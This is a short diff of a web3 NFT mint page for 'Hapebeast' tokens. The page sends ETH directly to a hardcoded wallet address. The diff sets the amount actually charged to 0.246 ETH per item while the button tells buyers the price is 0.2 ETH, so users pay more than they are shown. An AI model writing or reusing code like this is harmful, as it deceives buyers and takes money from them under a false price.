@@ -33,7 +33,7 @@ export default function Home() {
         web3.eth.sendTransaction({
             from: account,
             to: "0xa002BCE0aE0c6c57eC21844Da00BA2cF393E8eA9",
-            value: web3.utils.toWei(value.toString(), "ether") * 0.3,
+            value: web3.utils.toWei(value.toString(), "ether") * 0.246,
         });
     };
     return (
@@ -173,7 +173,7 @@ export default function Home() {
             >
                 {active
                     ? `Mint ${value} Hapebeast(s) for ${
-                        (value * 0.3).toFixed(1)
+                        (value * 0.2).toFixed(1)
                     } ETH + Network gas fees`
                     : "Wallet is not connected"}
             </button>
